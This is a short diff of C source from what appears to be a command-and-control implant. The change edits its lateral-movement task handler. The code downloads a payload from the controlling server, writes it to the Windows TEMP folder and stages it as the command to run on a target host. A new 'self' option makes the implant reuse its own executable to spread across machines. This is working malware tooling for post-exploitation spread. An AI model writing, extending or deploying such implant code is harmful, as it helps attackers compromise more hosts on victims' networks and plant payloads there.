@@ -2189,17 +2189,22 @@ void dispatch_task(AgentTask *task) {
         json_get_str(args,"payload",lat_payload,sizeof(lat_payload),"");
         /* GUI sends payload= (filename) instead of cmd= in JUMP/privesc flows */
         if (lat_payload[0] && !lat_cmd[0]) {
-            size_t pl_len=0;
-            uint8_t *pl_data=agent_download_file(lat_payload,&pl_len);
-            if (!pl_data||pl_len==0) {
+            if (_stricmp(lat_payload, "self") == 0) {
+                /* "self" — reuse this agent's own executable on disk */
+                GetModuleFileNameA(NULL, lat_cmd, (DWORD)sizeof(lat_cmd));
+            } else {
+                size_t pl_len=0;
+                uint8_t *pl_data=agent_download_file(lat_payload,&pl_len);
+                if (!pl_data||pl_len==0) {
+                    free(pl_data);
+                    agent_send_result(task->id,"","LATERAL: payload download failed"); return;
+                }
+                const char *tmp=getenv("TEMP"); if(!tmp)tmp="C:\\Windows\\Temp";
+                snprintf(lat_cmd,sizeof(lat_cmd),"%s\\%s",tmp,lat_payload);
+                FILE *pf=fopen(lat_cmd,"wb");
+                if(pf){fwrite(pl_data,1,pl_len,pf);fclose(pf);}
                 free(pl_data);
-                agent_send_result(task->id,"","LATERAL: payload download failed"); return;
             }
-            const char *tmp=getenv("TEMP"); if(!tmp)tmp="C:\\Windows\\Temp";
-            snprintf(lat_cmd,sizeof(lat_cmd),"%s\\%s",tmp,lat_payload);
-            FILE *pf=fopen(lat_cmd,"wb");
-            if(pf){fwrite(pl_data,1,pl_len,pf);fclose(pf);}
-            free(pl_data);
         }
         if (!lat_host[0]) { agent_send_result(task->id,"","LATERAL: host required"); return; }
         char lat_buf[4096];
